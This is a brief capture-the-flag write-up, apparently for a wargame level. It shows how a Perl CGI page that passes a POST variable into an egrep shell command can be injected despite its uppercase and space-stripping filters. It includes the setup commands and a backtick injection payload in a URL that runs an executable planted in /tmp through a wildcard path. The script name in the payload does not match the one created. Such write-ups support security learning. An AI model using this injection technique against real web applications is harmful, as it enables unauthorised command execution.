# On our home directory we have a perl file of a web page

#While reading the source code, we found our entry point : a function that's takes 2 variables as input of a post request

# Moreover, the x variable is the only one to be evaluated in a shell command (egrep), here is our breach
# If it was just that, it would be to easy ... the code do some operation on our string before the egrep

# Firstly it make a toupper on it and then it remove all the space

# our exploit should be named only with capital letters and its should have execution right, because we can't just "sh file" due to the space removing
# We also need to print the output in a folder where we have write right

# First of all, lets create our output folder in tmp

mkdir /tmp/AZUR
chmod 777 /tmp/AZUR

#Then, just create a file that match the restriction (tmp will be escaped with a wildcard)

touch /tmp/AZUR/SCRIPT
chmod 777 /tmp/AZUR/SCRIPT

# fill it with a basic shell command

`getflag > /tmp/AZUR/out`

# Now lets use our exploit and cat the output

http://10.11.200.200:4646/level12.pl?x="`/*/AZUR/TEST`"

cat out
